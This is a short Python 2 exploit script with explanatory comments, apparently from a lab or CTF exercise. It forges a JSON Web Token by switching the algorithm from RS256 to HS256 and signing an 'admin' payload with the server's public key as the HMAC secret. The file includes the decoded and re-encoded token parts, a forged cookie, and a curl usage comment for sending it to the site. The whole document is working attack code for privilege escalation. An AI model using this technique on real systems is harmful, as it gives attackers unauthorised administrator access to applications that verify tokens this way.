# python 2 version exploit
# This exploit will break apart the JWT into its respective parts, decode the header and payload, change the payload to be an admin, change the header type to HS256, cimbine the new header and new payload to be the data that will be signed, and sign the new data with the public key in the public.pem file to make a new JWT.
# From here we can curl "curl -H "Cookie: auth=" http://so/" where the cookie is the new JWT cooking without the trailing "=" and the URL of the main site. 
# This new token can also be placed in the webpage once logged in as a general user and then replacing the cookie for the new token. On refresh the user will be admin.

import hmac
import base64
import hashlib


f = open("../../../Downloads/public.pem")
key = f.read()
# print("key: "+key)


# RS => HS
# eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9  =>> "{"typ":"JWT","alg":"RS256"}" ==> {"typ":"JWT","alg":"HS256"} ==> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg==
# . 
# test-> admin
# eyJsb2dpbiI6InRlc3QifQ ==> {"login":"test" ==> {"login":"admin" ==> eyJsb2dpbiI6ImFkbWluIgo=
# eyJsb2dpbiI6InRlc3QifQ ==> {"login":"test" ==> {"login":"admin"} ==> eyJsb2dpbiI6ImFkbWluIn0K
# .
# original signature: 
# ZabKsEue5gDPyvwNnS8Xned104AR5V4LFaM4ApaLM9OvG2SEQbiiOwLvwFXM0mqAI7xoJXDosbjvNFzz21rthQDZseZkrw9Ogebbxr6b14wO6p64VQV0siBKroL_xWa8o5chkSru1kEEHAsEm5CaZvQlhshDvZc0gf-_eE0ZPudVO2j3ie_70dEqVCQJ5d86iYp5Ob0SRJdjpXNnYcmFnj9KOLnuM6TGzYExWqVRw2II2Iovjahq0IjacnnO47Hpixe8YHuTVZtzDTNLcqGvslNxYAq2efMWLktqM6rOU5k-CrtqVV3vc1bgcXmTOCI2_3FsnDQ2_hssWaocA18EEw

# str made without == eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg.eyJsb2dpbiI6ImFkbWluIn0K"
str = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg.eyJsb2dpbiI6ImFkbWluIn0K"
# cookie: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg.eyJsb2dpbiI6ImFkbWluIn0K.uDOxFCZxq_1UjjzichL72YJD2D6vpb1xF5mYfKZUDhk
# ==>KEYYYYY


sig = base64.urlsafe_b64encode(hmac.new(key, str, hashlib.sha256).digest()).decode('UTF-8').rstrip("=")
# print(sig)
print("cookie: "+str+"."+sig)